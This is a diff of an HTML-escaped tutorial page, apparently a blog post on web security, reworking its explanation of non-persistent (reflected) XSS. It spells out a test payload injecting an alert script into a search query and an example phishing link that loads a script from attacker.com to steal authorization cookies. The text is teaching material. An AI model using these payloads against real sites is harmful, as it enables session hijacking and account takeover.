@@ -502,25 +502,19 @@ chmod +x date
 &lt;/ul&gt;
 &lt;p&gt;The ampersand should never appear in most HTML sections. Both angle brackets should not be used inside a tag, unless  properly quoted. Quote characters inside a tag can also be harmless in text.&lt;/p&gt;
 &lt;p&gt;If desired, we could allow these characters using an encoding scheme based in  ampersands and a semicolon-terminated strings. This is known as the &lt;a href="http://www.w3schools.com/html/html_entities.asp"&gt;Entity Encoding&lt;/a&gt;.&lt;/p&gt;
-&lt;h3&gt;Non-Persistent Attack:&lt;/h3&gt;
-&lt;p&gt;XSS non-persistent attacks consist on getting users to click a link with attacker's script. A typical scenario is the following:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;The target website perform  query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message &lt;strong&gt;Pwnd&lt;/strong&gt; is displayed:&lt;/li&gt;
-&lt;/ol&gt;
+&lt;h3&gt;Non-Persistent XSS Attack:&lt;/h3&gt;
+&lt;p&gt;Non-persistent XSS attacks rely on getting users to click on a link with attacker's script. A typical scenario is described as the following:&lt;/p&gt;
+&lt;p&gt;1) The target website perform  query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message &lt;strong&gt;Pwnd&lt;/strong&gt; is displayed:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=&amp;lt;script%20type=&amp;#39;text/javascript&amp;#39;&amp;gt;alert(&amp;#39;Pwnd!&amp;#39;);&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;ol&gt;
-&lt;li&gt;The attacker crafts an exploit script that gets the victim's authorization information (for example in an &lt;strong&gt;Authorization Cookie&lt;/strong&gt;). The attacker sends a &lt;strong&gt;phishing email&lt;/strong&gt; to the victim with a link with some script such as:&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;2) The attacker crafts an exploit script that gets the victim's authorization information (for example in an &lt;strong&gt;Authorization Cookie&lt;/strong&gt;). The attacker sends a &lt;strong&gt;phishing email&lt;/strong&gt; to the victim with a link with some script such as:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=puppies&amp;lt;script%20src=&amp;quot;http://attacker.com/exploit.js&amp;quot;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;ol&gt;
-&lt;li&gt;If the victim clicks in the link, her/his browser runs the script (legitimate by the &lt;strong&gt;Same Origin Policy&lt;/strong&gt;, &lt;em&gt;i.e&lt;/em&gt; resources are shared between origins with same protocol, domain and port).  The attacker now has control of the victim's identity in that website. If the victim is the administrator, it is game over.&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;3) If the victim clicks in the link, her/his browser runs the script (legitimate by the &lt;strong&gt;Same Origin Policy&lt;/strong&gt;, &lt;em&gt;i.e&lt;/em&gt; resources are shared between origins with same protocol, domain and port).  The attacker now has control of the victim's identity in that website. If the victim is the administrator, it is game over.&lt;/p&gt;
 &lt;h3&gt;Persistent Attack:&lt;/h3&gt;
 &lt;p&gt;XSS persistent attacks store a malicious script in the databases, which will retrieved by the users. A typical scenario is the following:&lt;/p&gt;
 &lt;ol&gt;
